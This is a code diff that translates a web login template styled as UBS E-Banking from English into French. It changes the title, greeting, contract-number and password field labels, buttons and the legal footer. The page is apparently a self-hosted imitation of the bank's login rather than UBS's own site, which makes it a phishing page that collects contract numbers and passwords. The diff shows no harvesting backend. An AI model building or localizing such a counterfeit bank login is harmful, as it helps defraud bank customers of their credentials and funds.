@@ -4,7 +4,7 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <meta name="csrf-token" content="{{ csrf_token() }}">
-<title>UBS E-Banking – Login</title>
+<title>UBS E-Banking – Connexion</title>
 <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logodb.png') }}">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -339,8 +339,8 @@ html,body{
 <main class="ubs-main">
   <div class="login-card">
 
-    <h1 class="card-title">Hello</h1>
-    <p class="card-subtitle">Log in to UBS E-Banking</p>
+    <h1 class="card-title">Bonjour</h1>
+    <p class="card-subtitle">Connectez-vous à UBS E-Banking</p>
 
     <!-- Message d'erreur -->
     <div class="error-msg" id="errorMsg">
@@ -359,7 +359,7 @@ html,body{
         <path d="M8 4.5v3.5l2 1.2" stroke="#0069b4" stroke-width="1.3" stroke-linecap="round"/>
       </svg>
       <span class="account-chip-num" id="chipNum"></span>
-      <button class="chip-change" id="chipChange" type="button">Change</button>
+      <button class="chip-change" id="chipChange" type="button">Changer</button>
     </div>
 
     {{-- ── ÉTAPE 1 : numéro de compte ── --}}
@@ -369,8 +369,8 @@ html,body{
         <input class="field-input" type="text"
                id="compteBancaire" name="numero_compte"
                inputmode="numeric" autocomplete="off" maxlength="20"/>
-        <label class="field-label" for="compteBancaire">Contract number</label>
-        <span class="field-icon" title="Your contract number is on your UBS card or welcome letter.">
+        <label class="field-label" for="compteBancaire">Numéro de contrat</label>
+        <span class="field-icon" title="Votre numéro de contrat figure sur votre carte UBS ou dans votre lettre de bienvenue.">
           <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
             <circle cx="8" cy="8" r="7.5" stroke="currentColor" stroke-width="1.2"/>
             <path d="M8 7v5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
@@ -381,7 +381,7 @@ html,body{
 
       <div class="checkbox-row">
         <input type="checkbox" id="saveContract"/>
-        <label for="saveContract">Save contract number</label>
+        <label for="saveContract">Sauvegarder le Numéro de contrat</label>
       </div>
     </div>
 
@@ -391,7 +391,7 @@ html,body{
         <input class="field-input" type="password"
                id="pwInput" name="password"
                autocomplete="current-password" minlength="8"/>
-        <label class="field-label" for="pwInput">Password</label>
+        <label class="field-label" for="pwInput">Mot de passe</label>
         {{-- Icône œil afficher/cacher --}}
         <button class="pw-eye" type="button" id="pwEye" aria-label="Show/hide password">
           <svg id="eyeOpen" width="18" height="18" viewBox="0 0 24 24" fill="none"
@@ -414,14 +414,14 @@ html,body{
 
     <!-- Bouton principal -->
     <button class="btn-main" type="button" id="mainBtn">
-      <span class="btn-label">Continue</span>
+      <span class="btn-label">Continuer</span>
       <span class="spinner"></span>
     </button>
 
 
     <button class="how-link" type="button" onclick="window.open('https://www.ubs.com/global/en/wealth-management/our-approach/digital-banking/e-banking/how-to-connect.html', '_blank')">
       <span class="how-link-arrow">›</span>
-      How to connect
+     Comment se connecter
     </button>
 
   </div>
@@ -439,9 +439,7 @@ html,body{
     <button class="footer-link" type="button">Report fraudulent correspondence</button>
   </div>
   <p class="footer-legal">
-    The products, services, information and/or materials contained within this website may not be
-    available to residents of certain jurisdictions. Please consult the sales restrictions relating
-    to the products or services in question for further information.
+    Les produits, services, informations et/ou éléments figurant sur ce site Internet peuvent ne pas être accessibles aux résidents de certaines juridictions. Veuillez consulter les restrictions de vente applicables aux produits ou services concernés pour obtenir de plus amples informations.
   </p>
   <p class="footer-copy">© UBS 1998–2026. All rights reserved.</p>
 </footer>
